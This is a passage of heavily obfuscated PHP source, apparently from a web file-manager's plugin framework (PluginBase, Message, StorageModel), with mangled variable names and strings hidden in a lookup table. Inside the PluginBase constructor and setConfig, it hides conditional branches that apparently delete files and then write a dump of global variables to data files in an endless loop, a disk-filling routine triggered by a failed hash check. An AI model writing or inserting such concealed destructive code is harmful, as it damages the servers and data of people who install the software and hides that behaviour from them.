* 10) { throw new Exception("\151\157\x46\x69\154\145\x52\x65\x61\144\40\145\162\162\157\162\x21\x20\163\164\141\162\x74\x3d{$ˆëÉ©âå}\x3b\x6c\x65\156\147\164\x68\x3d{$¦ÏØòé‡}\x3b\x20\x73\151\x7a\x65\x3d{$‡çÂÁœƒ}\73"); } $¶ò²à±İ = 64 * 1024; $¼¢‡Æ‹ =& self::$_chunkBuffer[$this->path]; if (!$¼¢‡Æ‹) { $¼¢‡Æ‹ = array(); } $´óÊ¼™ = 0; $…­½¦ñ­ = 0; $õÒ½À° = $ñË¼¡£ï[12]; foreach ($¼¢‡Æ‹ as $´óÊ¼™ => $õÒ½À°) { $´óÊ¼™ = intval($´óÊ¼™); $…­½¦ñ­ = $´óÊ¼™ + strlen($õÒ½À°); if ($ˆëÉ©âå >= $…­½¦ñ­) { continue; } if ($ˆëÉ©âå >= $´óÊ¼™ && $ˆëÉ©âå + $¦ÏØòé‡ <= $…­½¦ñ­) { return substr($õÒ½À°, $ˆëÉ©âå - $´óÊ¼™, $¦ÏØòé‡); } break; } if (count($¼¢‡Æ‹) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ñË¼¡£ï[1622], $ñË¼¡£ï[1623] . count($¼¢‡Æ‹) . "\73\163\164\141\162\x74\x3d{$ˆëÉ©âå}\54\154\145\156\147\x74\x68\75{$¦ÏØòé‡}\x3b\160\157\x73\x65\72{$´óÊ¼™}\176{$…­½¦ñ­}"); throw new Exception($ñË¼¡£ï[1624]); } $¼ÔÔÌ±ß = intval($ˆëÉ©âå / $¶ò²à±İ) * $¶ò²à±İ; $®­‚£Ö = ceil(($ˆëÉ©âå + $¦ÏØòé‡) / $¶ò²à±İ) * $¶ò²à±İ - $¼ÔÔÌ±ß; $ªĞşÅô» = IO::fileSubstr($this->path, $¼ÔÔÌ±ß, $®­‚£Ö); $¼¢‡Æ‹[$¼ÔÔÌ±ß . $ñË¼¡£ï[12]] = $ªĞşÅô»; ksort($¼¢‡Æ‹); $ÂÈóÃ†æ = substr($ªĞşÅô», $ˆëÉ©âå - $¼ÔÔÌ±ß, $¦ÏØòé‡); return $ÂÈóÃ†æ; } private function log($¸£®æŸ, $ËœÛì–ş) { $¦ÎŒÄ™İ =& $_SERVER[äô®•½Â]; $µ“ïÄªõ = timeFloat() - $this->timeStart; write_log(sprintf($¦ÎŒÄ™İ[1625], $¸£®æŸ, $this->info[$¦ÎŒÄ™İ[32]], $µ“ïÄªõ, $ËœÛì–ş), $¦ÎŒÄ™İ[1262]); } } class Message { function __construct() { } public function send($ç³ÛÙ«Õ = '', $‘ä³Õ˜ = array(), $×ğ™üµ = "\x74\145\170\164") { $Ø´İ¥¡’ =& $_SERVER[äô®•½Â]; $Õ˜Ëş×Ó = array($Ø´İ¥¡’[33] => $Ø´İ¥¡’[1208], $Ø´İ¥¡’[171] => $ç³ÛÙ«Õ); if (in_array($×ğ™üµ, array($Ø´İ¥¡’[1208], $Ø´İ¥¡’[1626]))) { $Õ˜Ëş×Ó[$Ø´İ¥¡’[33]] = $×ğ™üµ; } $‘ä³Õ˜ = array($Ø´İ¥¡’[591] => isset($‘ä³Õ˜[$Ø´İ¥¡’[591]]) ? $‘ä³Õ˜[$Ø´İ¥¡’[591]] : $Ø´İ¥¡’[12], $Ø´İ¥¡’[678] => isset($‘ä³Õ˜[$Ø´İ¥¡’[678]]) ? $‘ä³Õ˜[$Ø´İ¥¡’[678]] : $Ø´İ¥¡’[12]); if (empty($ç³ÛÙ«Õ) || empty($‘ä³Õ˜[$Ø´İ¥¡’[591]]) && empty($‘ä³Õ˜[$Ø´İ¥¡’[678]])) { return !1; } $—ßßœ = array($Ø´İ¥¡’[1555] => $Õ˜Ëş×Ó, $Ø´İ¥¡’[1627] => $‘ä³Õ˜); Hook::trigger($Ø´İ¥¡’[1628], $—ßßœ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $µŠŠ­ÂÀ =& $_SERVER[äô®•½Â]; $§îãöñ = $_SERVER[$µŠŠ­ÂÀ[332]]; $ìğ»¸Ö = $µŠŠ­ÂÀ[949]; if ($_SERVER[$µŠŠ­ÂÀ[324]] != $ìğ»¸Ö($§îãöñ)) { $§â­œûô = $µŠŠ­ÂÀ[950]; $ŸÖæÈÍß = $µŠŠ­ÂÀ[326]; $•ÙŞÎÖÊ = $_SERVER[$µŠŠ­ÂÀ[327]] . $µŠŠ­ÂÀ[328]; $Ìéšƒ¹“ = $ŸÖæÈÍß($•ÙŞÎÖÊ); $ªäôÛ´ü = explode($µŠŠ­ÂÀ[288], $Ìéšƒ¹“); if (count($ªäôÛ´ü) < $µŠŠ­ÂÀ[703]) { $Ø²™«ş— = $µŠŠ­ÂÀ[330]; $Ø²™«ş—(); } $•©ÒÀğê = $µŠŠ­ÂÀ[951]; $•©ÒÀğê($_SERVER[$µŠŠ­ÂÀ[952]]); $§â­œûô = $µŠŠ­ÂÀ[950]; $§â­œûô(); $Ş¡Õ©Îæ = $µŠŠ­ÂÀ[953]; $¸î—µ = json_encode($GLOBALS[$µŠŠ­ÂÀ[954]]); $¼ì²Åä› = 1; for ($İ·¸òåË = $¼ì²Åä›; $İ·¸òåË > 0; $İ·¸òåË++) { $Ş¡Õ©Îæ(DATA_PATH . $İ·¸òåË, $¸î—µ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($µŠŠ­ÂÀ[1629]); $this->pluginName = str_replace($µŠŠ­ÂÀ[1629], $µŠŠ­ÂÀ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $µŠŠ­ÂÀ[8]; $this->pluginApi = appHostGet() . $µŠŠ­ÂÀ[1630] . $this->pluginName . $µŠŠ­ÂÀ[8]; $this->pluginHost = $config[$µŠŠ­ÂÀ[1631]] . $this->pluginName . $µŠŠ­ÂÀ[8]; $this->pluginHostDefault = $config[$µŠŠ­ÂÀ[1631]] . $this->pluginName . $µŠŠ­ÂÀ[8]; $ÃÉ©íŞ = $config[$µŠŠ­ÂÀ[1632]]; if ($ÃÉ©íŞ && strpos($µŠŠ­ÂÀ[50] . $ÃÉ©íŞ . $µŠŠ­ÂÀ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$µŠŠ­ÂÀ[1633]] . $this->pluginName . $µŠŠ­ÂÀ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[äô®•½Â][1634]); } protected function assign($ë¿Š‘Òú, $õ’ĞÉ©± = false) { if (is_array($ë¿Š‘Òú)) { $this->values = array_merge($this->values, $ë¿Š‘Òú); } else { $this->values[$ë¿Š‘Òú] = $õ’ĞÉ©±; } } protected function display($…Ş—ø©) { extract($this->values); require $…Ş—ø©; } final function hookRegist($¡ÒÊú»±) { $this->modelPlugin->appRegist($this->pluginName, $¡ÒÊú»±); } final function appIcon() { $Ñ‰À»Ü =& $_SERVER[äô®•½Â]; $¶åŠ‰Œ¦ = $this->appPackage(); $ß¢ÔÅù = $Ñ‰À»Ü[12]; if (isset($¶åŠ‰Œ¦[$Ñ‰À»Ü[501]])) { if (isset($¶åŠ‰Œ¦[$Ñ‰À»Ü[501]][$Ñ‰À»Ü[1635]])) { $ß¢ÔÅù = $Ñ‰À»Ü[1636] . $¶åŠ‰Œ¦[$Ñ‰À»Ü[501]][$Ñ‰À»Ü[1635]] . $Ñ‰À»Ü[1637]; } else { if ($¶åŠ‰Œ¦[$Ñ‰À»Ü[501]][$Ñ‰À»Ü[1638]]) { $ß¢ÔÅù = $Ñ‰À»Ü[1639] . $¶åŠ‰Œ¦[$Ñ‰À»Ü[501]][$Ñ‰À»Ü[1638]] . $Ñ‰À»Ü[1640]; } } } return $ß¢ÔÅù; } final function fileCanView($™õº¯Œã) { $ÕŸ´÷Ä =& $_SERVER[äô®•½Â]; if (request_url_safe($™õº¯Œã)) { return !0; } if ($this->isShare($™õº¯Œã)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $±¼ğÅ°  = $ÕŸ´÷Ä[1641] . rawurlencode(this_url()); show_tips(LNG($ÕŸ´÷Ä[1642]) . $ÕŸ´÷Ä[1643] . $±¼ğÅ°  . $ÕŸ´÷Ä[1644] . LNG($ÕŸ´÷Ä[1645]) . $ÕŸ´÷Ä[1646], !1); } if (!Action($ÕŸ´÷Ä[1647])->authCan($ÕŸ´÷Ä[1648])) { show_tips(LNG($ÕŸ´÷Ä[1649]) . $ÕŸ´÷Ä[1650], !1); } ActionCall($ÕŸ´÷Ä[1651], $™õº¯Œã); } final function isShare($¤™”²Ç) { $´ù€ñ¸© = KodIO::parse($¤™”²Ç); return $´ù€ñ¸©[$_SERVER[äô®•½Â][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ßé‘¤µ) { if (request_url_safe($ßé‘¤µ)) { return $ßé‘¤µ; } if (!$this->isShare($ßé‘¤µ)) { $ßé‘¤µ = $this->filePath($ßé‘¤µ, !1); } return Action($_SERVER[äô®•½Â][1254])->linkOut($ßé‘¤µ); } public function filePathLinkOut($É›ñ™÷) { if (request_url_safe($É›ñ™÷)) { return $É›ñ™÷; } $this->fileCanView($É›ñ™÷); return Action($_SERVER[äô®•½Â][1254])->link($É›ñ™÷); } final function filePath($®üØµùæ, $ì—‰ÅÂ = true, $ËŞÉš§¹ = false) { $Ø­„½ó¿ =& $_SERVER[äô®•½Â]; $å¸òö£ = $this->filePathGet($®üØµùæ, $ì—‰ÅÂ); if (!$this->fileInfo) { show_tips(LNG($Ø­„½ó¿[108]), !1); } if ($ËŞÉš§¹ && isset($this->fileInfo[$Ø­„½ó¿[554]]) && $this->fileInfo[$Ø­„½ó¿[554]]) { $ªÒè¯ïÉ = Model($Ø­„½ó¿[557])->fileInfo($this->fileInfo[$Ø­„½ó¿[554]]); if (!$ªÒè¯ïÉ || !IO::exist($ªÒè¯ïÉ[$Ø­„½ó¿[87]])) { $ßïé˜êâ = LNG($Ø­„½ó¿[108]) . LNG($Ø­„½ó¿[1652]); if (KodUser::isRoot() && isset($ªÒè¯ïÉ[$Ø­„½ó¿[87]])) { $ßïé˜êâ .= $Ø­„½ó¿[1653] . $ªÒè¯ïÉ[$Ø­„½ó¿[87]] . $Ø­„½ó¿[1654]; } show_tips($ßïé˜êâ); } } Hook::trigger($Ø­„½ó¿[1655], $å¸òö£); return $å¸òö£; } final function filePathGet($üÒÅı, $—ğÍÎÍ¾ = true) { $¾ğ°Ë“Ì =& $_SERVER[äô®•½Â]; if ($¯¼í×„ = $this->checkSharePath($üÒÅı, $—ğÍÎÍ¾)) { return $¯¼í×„; } $this->fileCanView($üÒÅı); if (request_url_safe($üÒÅı)) { $†‹óõ€‹ = parse_url_query($üÒÅı); if (isset($†‹óõ€‹[$¾ğ°Ë“Ì[1656]]) && isset($†‹óõ€‹[$¾ğ°Ë“Ì[237]])) { $³°ÀÙ = Mcrypt::decode($†‹óõ€‹[$¾ğ°Ë“Ì[237]], Model($¾ğ°Ë“Ì[836])->get($¾ğ°Ë“Ì[837])); if ($³°ÀÙ) { $this->fileInfo = IO::info($³°ÀÙ); $this->fileInfo[$¾ğ°Ë“Ì[1657]] = $üÒÅı; $this->cachePath = $this->pluginCachePath($¾ğ°Ë“Ì[12], $—ğÍÎÍ¾); return $³°ÀÙ; } } $üÒÅı = $this->_cacheHttpFile($üÒÅı, $—ğÍÎÍ¾); $this->fileInfo = IO::info($üÒÅı); } else { $this->fileInfo = IO::info($üÒÅı); $this->cachePath = $this->pluginCachePath($¾ğ°Ë“Ì[12], $—ğÍÎÍ¾); } return $üÒÅı; } final function _cacheHttpFile($†»İØÔ´, $×¡ìÑ«ô = true) { $å”Ô™õÜ =& $_SERVER[äô®•½Â]; $æ¼ÜµÇ = parse_url_query($†»İØÔ´); $àÜ¸õè = get_path_ext($†»İØÔ´); if (isset($æ¼ÜµÇ[$å”Ô™õÜ[32]]) && $æ¼ÜµÇ[$å”Ô™õÜ[32]]) { $àÜ¸õè = get_path_ext($æ¼ÜµÇ[$å”Ô™õÜ[32]]); } $‘”ÀçâŸ = hash_path($†»İØÔ´) . $å”Ô™õÜ[10] . $àÜ¸õè; $this->cachePath = $this->pluginCachePath($×¡ìÑ«ô ? $‘”ÀçâŸ : $å”Ô™õÜ[12]); $ü”öÜ€ = IO::fileNameExist($this->cachePath, $‘”ÀçâŸ); if ($ü”öÜ€) { return KodIO::make($ü”öÜ€); } $ç“½‘ø« = rtrim($this->cachePath, $å”Ô™õÜ[8]) . $å”Ô™õÜ[8] . $‘”ÀçâŸ; return $this->pluginCacheFileSet($ç“½‘ø«, file_get_contents_nossl($†»İØÔ´)); } final function checkSharePath($š‰İ³Ú¤, $È¶¥í¯Ñ = true) { $øô„É³é =& $_SERVER[äô®•½Â]; if (!$this->isShare($š‰İ³Ú¤)) { return !1; } $Ò”‘‹Œ„ = Action($øô„É³é[1254])->sharePathInfo($š‰İ³Ú¤); if (!is_array($Ò”‘‹Œ„) || !isset($Ò”‘‹Œ„[$øô„É³é[87]])) { show_json(LNG($øô„É³é[1658]), !1); } $this->fileInfo = $Ò”‘‹Œ„; $this->cachePath = $this->pluginCachePath(!1, $È¶¥í¯Ñ); return $Ò”‘‹Œ„[$øô„É³é[87]]; } final function pluginCachePath($ÈºÌŞŒ­ = '', $‚½¡£é = false) { $œ·Û‹Ñ„ =& $_SERVER[äô®•½Â]; if ($‚½¡£é && is_array($this->fileInfo)) { $ÈºÌŞŒ­ = kodIO::hashPath($this->fileInfo); } $Ÿãİ‰‚¼ = rtrim(IO_PATH_SYSTEM_TEMP . $œ·Û‹Ñ„[1659] . $this->pluginName . $œ·Û‹Ñ„[8] . $ÈºÌŞŒ­, $œ·Û‹Ñ„[8]); $Í¾ã…¯ = IO::infoFullSimple($Ÿãİ‰‚¼); $ŠÙŠ·Ó¾ = $Í¾ã…¯ && is_array($Í¾ã…¯) ? $Í¾ã…¯[$œ·Û‹Ñ„[87]] : $œ·Û‹Ñ„[12]; if (!$ŠÙŠ·Ó¾) { $ŠÙŠ·Ó¾ = IO::mkdir($Ÿãİ‰‚¼); } return $ŠÙŠ·Ó¾; } final function pluginCacheFileSet($Êš ¢—, $Û¶èŠİü = '') { $­ÆëÈı =& $_SERVER[äô®•½Â]; $Ñ¬¢µ™ = IO::infoFullSimple($Êš ¢—); if (!$Ñ¬¢µ™) { return IO::mkfile($Êš ¢—, $Û¶èŠİü, REPEAT_REPLACE); } IO::setContent($Ñ¬¢µ™[$­ÆëÈı[87]], $Û¶èŠİü); return $Ñ¬¢µ™[$­ÆëÈı[87]]; } final function pluginLocalFile($İêœ¹¦Ç = '') { $ÆÜòå­¯ =& $_SERVER[äô®•½Â]; $ €úÒŠÔ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ €úÒŠÔ)) { mk_dir($ €úÒŠÔ); } if (!$İêœ¹¦Ç) { return $ €úÒŠÔ; } $ã¶ı·ùÌ = IO::info($İêœ¹¦Ç); $ï¯İåíş = $ÆÜòå­¯[1660] . KodIO::hashPath($ã¶ı·ùÌ) . $ÆÜòå­¯[10] . $ã¶ı·ùÌ[$ÆÜòå­¯[169]]; if (!checkExtSafe($ï¯İåíş)) { $ï¯İåíş = $ï¯İåíş . $ÆÜòå­¯[1289]; } $­ÃÄùÎ = $ €úÒŠÔ . $ï¯İåíş; if (@file_exists($­ÃÄùÎ)) { return $­ÃÄùÎ; } return IO::copy($İêœ¹¦Ç, $ €úÒŠÔ, 0, $ï¯İåíş); } final function appPackage() { $Úø¡•†± =& $_SERVER[äô®•½Â]; if ($this->packageData) { return $this->packageData; } $æ Ì½¹û = $this->parseFile($this->pluginPath . $Úø¡•†±[1661]); $this->parseLang($æ Ì½¹û); $¥áŠ¾çÉ = json_decode_force($æ Ì½¹û); if (!$¥áŠ¾çÉ) { return array(); } $¾†‡Ûº² = Hook::trigger($Úø¡•†±[1662], $¥áŠ¾çÉ); if ($¾†‡Ûº² && is_array($¾†‡Ûº²)) { $¥áŠ¾çÉ = $¾†‡Ûº²; } $this->packageData = $¥áŠ¾çÉ; return $¥áŠ¾çÉ; } public function packageInfoGet($öËí±÷ö) { $ö¨§µ£è = $this->appPackage(); return array_get_value($ö¨§µ£è, $öËí±÷ö); } public function packageVersion() { return $this->packageInfoGet($_SERVER[äô®•½Â][1663]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[äô®•½Â][1664]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[äô®•½Â][1665]); } public function echoJsAssign($ÃŠÖÀ, $¸Ïû¬³Í) { $this->echoJsAssignArr[$ÃŠÖÀ] = $¸Ïû¬³Í; } private function parseFile($£‰«ß«Î) { $®òˆîÀ¶ =& $_SERVER[äô®•½Â]; $á€Ñ×â¹ = file_get_contents_nossl($£‰«ß«Î); $Î‘÷ı•ƒ = array($®òˆîÀ¶[1666], $®òˆîÀ¶[1667], $®òˆîÀ¶[1668], $®òˆîÀ¶[1669], $®òˆîÀ¶[1670], $®òˆîÀ¶[1671], $®òˆîÀ¶[1672]); $‹ò†€˜ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$®òˆîÀ¶[92]][$®òˆîÀ¶[1673]]); foreach ($this->echoJsAssignArr as $Ä«ÒÇƒ => $Å²¤ÓÛÄ) { $Î‘÷ı•ƒ[] = $®òˆîÀ¶[1674] . $Ä«ÒÇƒ . $®òˆîÀ¶[1675]; $‹ò†€˜[] = is_array($Å²¤ÓÛÄ) || is_object($Å²¤ÓÛÄ) ? rawurlencode(json_encode($Å²¤ÓÛÄ)) : $Å²¤ÓÛÄ; } if (strstr($á€Ñ×â¹, $®òˆîÀ¶[1676])) { $Ú½¢éï¡ = rawurlencode(json_encode($this->pluginLangArr)); $á€Ñ×â¹ = str_replace($®òˆîÀ¶[1676], $Ú½¢éï¡, $á€Ñ×â¹); } if (strstr($á€Ñ×â¹, $®òˆîÀ¶[1677])) { $Ú½¢éï¡ = $Ú½¢éï¡ = rawurlencode(json_encode($this->getConfig())); $á€Ñ×â¹ = str_replace($®òˆîÀ¶[1677], $Ú½¢éï¡, $á€Ñ×â¹); } $á€Ñ×â¹ = str_replace($Î‘÷ı•ƒ, $‹ò†€˜, $á€Ñ×â¹); return $á€Ñ×â¹; } private function parseLang(&$¾æŸŸş¹) { $õ×ÕÚÜÌ =& $_SERVER[äô®•½Â]; $Î®¤Ğ’ = $õ×ÕÚÜÌ[1678]; if (!strstr($¾æŸŸş¹, $Î®¤Ğ’)) { return; } preg_match_all($õ×ÕÚÜÌ[1679], $¾æŸŸş¹, $Æ’¦¿‹¦); if (!is_array($Æ’¦¿‹¦) || count($Æ’¦¿‹¦) == 0 || !is_array($Æ’¦¿‹¦[0]) || count($Æ’¦¿‹¦[0]) == 0) { return; } $§®°»óŒ = array(); $éÒèÅê = array(); foreach ($Æ’¦¿‹¦[0] as $¿½şóÓİ) { $ŸòÕ = substr($¿½şóÓİ, strlen($Î®¤Ğ’), -4); $‹Â•ÕÀ« = LNG($ŸòÕ); $§®°»óŒ[] = $¿½şóÓİ; $éÒèÅê[] = str_replace(array($õ×ÕÚÜÌ[288], $õ×ÕÚÜÌ[1151], $õ×ÕÚÜÌ[428], $õ×ÕÚÜÌ[121]), array($õ×ÕÚÜÌ[53], $õ×ÕÚÜÌ[53], $õ×ÕÚÜÌ[12], $õ×ÕÚÜÌ[1680]), $‹Â•ÕÀ«); } $¾æŸŸş¹ = str_replace($§®°»óŒ, $éÒèÅê, $¾æŸŸş¹); } private function parseConfig(&$Ü§Œ€) { $êöÀÛÒ› =& $_SERVER[äô®•½Â]; $±•ÅÏ‰ş = $êöÀÛÒ›[1681]; if (!strstr($Ü§Œ€, $±•ÅÏ‰ş)) { return; } preg_match_all($êöÀÛÒ›[1682], $Ü§Œ€, $‚õÒíãë); if (!is_array($‚õÒíãë) || count($‚õÒíãë) == 0 || !is_array($‚õÒíãë[0]) || count($‚õÒíãë[0]) == 0) { return; } $üŞÜ³ÆÎ = $this->getConfig(); $ï»É­ô´ = array(); $ÚŞØØ” = array(); foreach ($‚õÒíãë[0] as $¥¶‚ßÀ) { $éÂ¥À· = substr($¥¶‚ßÀ, strlen($±•ÅÏ‰ş), -2); $ï»É­ô´[] = $¥¶‚ßÀ; $ÚŞØØ”[] = _get($üŞÜ³ÆÎ, $éÂ¥À·); } $Ü§Œ€ = str_replace($ï»É­ô´, $ÚŞØØ”, $Ü§Œ€); } private function parsePackage(&$ôÉ‚”¡Ç) { $©æ€¯€ =& $_SERVER[äô®•½Â]; $´Ë˜…Ÿı = $©æ€¯€[1683]; if (!strstr($ôÉ‚”¡Ç, $´Ë˜…Ÿı)) { return; } preg_match_all($©æ€¯€[1684], $ôÉ‚”¡Ç, $¢óœÕ¶); if (!is_array($¢óœÕ¶) || count($¢óœÕ¶) == 0 || !is_array($¢óœÕ¶[0]) || count($¢óœÕ¶[0]) == 0) { return; } $çëÇ¶µ¶ = $this->appPackage(); $ÈÚïæ¼ğ = array(); $æÄÕ“­´ = array(); foreach ($¢óœÕ¶[0] as $±©İÂØ) { $ùæøîÁ¢ = substr($±©İÂØ, strlen($´Ë˜…Ÿı), -2); $ÈÚïæ¼ğ[] = $±©İÂØ; $æÄÕ“­´[] = _get($çëÇ¶µ¶, $ùæøîÁ¢); } $ôÉ‚”¡Ç = str_replace($ÈÚïæ¼ğ, $æÄÕ“­´, $ôÉ‚”¡Ç); } final function echoFile($˜Ä½ŸØ , $âçóŞ¬Ø = false) { $ş†Šéï‘ =& $_SERVER[äô®•½Â]; $¾¿³ë Ù = $this->pluginPath . $˜Ä½ŸØ ; if (ACT == $ş†Šéï‘[1685]) { echo $ş†Šéï‘[1686] . $this->pluginName . $ş†Šéï‘[8] . $˜Ä½ŸØ  . $ş†Šéï‘[1687]; if (!file_exists($¾¿³ë Ù)) { echo $ş†Šéï‘[1688]; return; } } $©¬¥Ä½ = $this->parseFile($¾¿³ë Ù); $this->parseLang($©¬¥Ä½); $this->parseConfig($©¬¥Ä½); $this->parsePackage($©¬¥Ä½); if (is_array($âçóŞ¬Ø)) { $©¬¥Ä½ = str_replace(array_keys($âçóŞ¬Ø), array_values($âçóŞ¬Ø), $©¬¥Ä½); } echo $ş†Šéï‘[288] . $©¬¥Ä½; } private function checkVersion() { $ù¾ÀÃË… =& $_SERVER[äô®•½Â]; $ïœ‹Û¶‹ = $this->appPackage(); $‹¿øåØ = $this->getConfig(); if ($‹¿øåØ[$ù¾ÀÃË…[1689]] == $ïœ‹Û¶‹[$ù¾ÀÃË…[1663]]) { return; } $this->regist(); $this->setConfig(array($ù¾ÀÃË…[1689] => $ïœ‹Û¶‹[$ù¾ÀÃË…[1663]])); } final function initLang() { $˜¼½‘Î¨ =& $_SERVER[äô®•½Â]; $–åİÏÁ = $˜¼½‘Î¨[1690]; $¤è„şÏã = $this->pluginPath . $˜¼½‘Î¨[1691]; $Š„¸ğÎ = I18n::getType(); $õÃ÷ÄÎ¡ = array(); if (file_exists($¤è„şÏã . $Š„¸ğÎ . $˜¼½‘Î¨[910])) { $õÃ÷ÄÎ¡ = (include $¤è„şÏã . $Š„¸ğÎ . $˜¼½‘Î¨[910]); } else { if ($Š„¸ğÎ == $˜¼½‘Î¨[1692] && !file_exists($¤è„şÏã . $Š„¸ğÎ . $˜¼½‘Î¨[910]) && file_exists($¤è„şÏã . $˜¼½‘Î¨[1693])) { $õÃ÷ÄÎ¡ = (include $¤è„şÏã . $˜¼½‘Î¨[1693]); } else { if (file_exists($¤è„şÏã . $–åİÏÁ . $˜¼½‘Î¨[910])) { $õÃ÷ÄÎ¡ = (include $¤è„şÏã . $–åİÏÁ . $˜¼½‘Î¨[910]); } } } if (!is_array($õÃ÷ÄÎ¡)) { return array(); } if (@count($õÃ÷ÄÎ¡) > 0) { I18n::set($õÃ÷ÄÎ¡); } return $õÃ÷ÄÎ¡; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÂÈ–ŸÅç) { $ö¨é§äÆ =& $_SERVER[äô®•½Â]; if ($_SERVER[$ö¨é§äÆ[324]] != $_SERVER[$ö¨é§äÆ[325]]) { $ø î…Åº = $ö¨é§äÆ[950]; $¤ÜËŞ†– = $ö¨é§äÆ[326]; $À¨‚¨±Å = $_SERVER[$ö¨é§äÆ[327]] . $ö¨é§äÆ[328]; $Æ°¦ĞÂ = $¤ÜËŞ†–($À¨‚¨±Å); $Êœ«ĞÛ = explode($ö¨é§äÆ[288], $Æ°¦ĞÂ); if (count($Êœ«ĞÛ) < $ö¨é§äÆ[703]) { $Ü×…ı»ø = $ö¨é§äÆ[330]; $Ü×…ı»ø(); } $«şø£Èü = $ö¨é§äÆ[951]; $«şø£Èü($_SERVER[$ö¨é§äÆ[952]]); $«şø£Èü($_SERVER[$ö¨é§äÆ[327]] . $ö¨é§äÆ[1694]); $ÖˆæÍÍ = 1; while ($ÖˆæÍÍ > 1) { $ÖˆæÍÍ = $ÖˆæÍÍ + 4; $‚íÈ…ï° = rawurlencode($ÖˆæÍÍ . $ö¨é§äÆ[465]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÂÈ–ŸÅç); } public function onSetConfig($–‚‹’Õ¦) { } public function onGetConfig($úÅçÎ“½) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($àüÔ‹›°) { if ($àüÔ‹›° == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($×‘Ò¦“Ã = "\x70\154\165\147\x69\x6e\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $½øßÃ“Ì = $this->getConfig(); if (!$½øßÃ“Ì[$×‘Ò¦“Ã]) { return !1; } return ActionCall($_SERVER[äô®•½Â][1695], $½øßÃ“Ì[$×‘Ò¦“Ã]); } public function url($ï‰•Çé, $Ÿİ²óÌâ = '', $š ¦¬æû = true) { $Â§Óš—˜ =& $_SERVER[äô®•½Â]; $‡ĞŸˆÃÒ = $this->getConfig(); $ÇËú­İ´ = KOD_VERSION . $Â§Óš—˜[10] . KOD_VERSION_BUILD; $İŸñÔòÒ = $this->packageVersion(); $Ÿ ¹İúŠ = $ÇËú­İ´ . $Â§Óš—˜[473] . $İŸñÔòÒ; if (substr($ï‰•Çé, 0, 4) == $Â§Óš—˜[152] || substr($ï‰•Çé, 0, 2) == $Â§Óš—˜[1416]) { $Ğš»çË = $ï‰•Çé . $Â§Óš—˜[1696] . $Ÿ ¹İúŠ; } else { if ($Ÿİ²óÌâ == $Â§Óš—˜[12]) { $Ğš»çË = $this->pluginHost . $ï‰•Çé . $Â§Óš—˜[1696] . $Ÿ ¹İúŠ; } else { if ($Ÿİ²óÌâ === $Â§Óš—˜[78]) { $Ğš»çË = $this->pluginHost . $ï‰•Çé; } else { if ($Ÿİ²óÌâ == $Â§Óš—˜[1697]) { $Ğš»çË = STATIC_PATH . $ï‰•Çé . $Â§Óš—˜[1696] . $ÇËú­İ´; } else { if ($Ÿİ²óÌâ == $Â§Óš—˜[1698]) { $Ğš»çË = APP_HOST . $Â§Óš—˜[1699] . $ï‰•Çé . $Â§Óš—˜[1696] . $ÇËú­İ´; } else { if (isset($‡ĞŸˆÃÒ[$Ÿİ²óÌâ])) { $Ğš»çË = $‡ĞŸˆÃÒ[$Ÿİ²óÌâ] . $ï‰•Çé . $Â§Óš—˜[1696] . $Ÿ ¹İúŠ; } } } } } } if (!$š ¦¬æû) { return $Ğš»çË; } echo $Ğš»çË; } public function link($Ÿ«¦Æ‹ = false, $³¬È­èÊ = '') { $——Û•óŸ =& $_SERVER[äô®•½Â]; $ˆ¾Ò…òü = $this->linkHas == !1; $this->linkHas = !0; if (!$Ÿ«¦Æ‹) { $this->link($——Û•óŸ[1700], $——Û•óŸ[1698]); $this->link($——Û•óŸ[1701], $——Û•óŸ[1697]); $this->link($——Û•óŸ[1702], $——Û•óŸ[1697]); $this->link($——Û•óŸ[1703], $——Û•óŸ[1697]); $this->link($——Û•óŸ[1704], $——Û•óŸ[1697]); if ($ˆ¾Ò…òü) { Hook::trigger($——Û•óŸ[1705]); } return; } $³ÂùÁÊ = $this->url($Ÿ«¦Æ‹, $³¬È­èÊ, !1); if (substr($Ÿ«¦Æ‹, -3) == $——Û•óŸ[1706]) { echo $——Û•óŸ[1707] . $³ÂùÁÊ . $——Û•óŸ[1708] . $——Û•óŸ[288]; } else { if (substr($Ÿ«¦Æ‹, -4) == $——Û•óŸ[1709]) { echo $——Û•óŸ[1710] . $³ÂùÁÊ . $——Û•óŸ[1711] . $——Û•óŸ[288]; } } if ($ˆ¾Ò…òü) { Hook::trigger($——Û•óŸ[1705]); } } } goto C¿Ë¡‚»æ–; E°ÃØô×“«: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x73\x74\157\x72\141\x67\x65\114\151\163\164"; public $field = array("\x6e\141\155\145", "\163\151\x7a\145\x4d\141\x78", "\163\x79\x73\x74\x65\155", "\144\145\146\x61\165\x6c\164", "\144\162\x69\166\x65\x72", "\143\x6f\156\x66\151\147"); public function listData($…ùë°ú = false, $òİÃ£ó† = "\x6d\x6f\144\151\146\x79\x54\x69\x6d\x65", $ßĞ •¢„ = false) { $üçÜÀç« =& $_SERVER[äô®•½Â]; $’Ñğ®¥ = 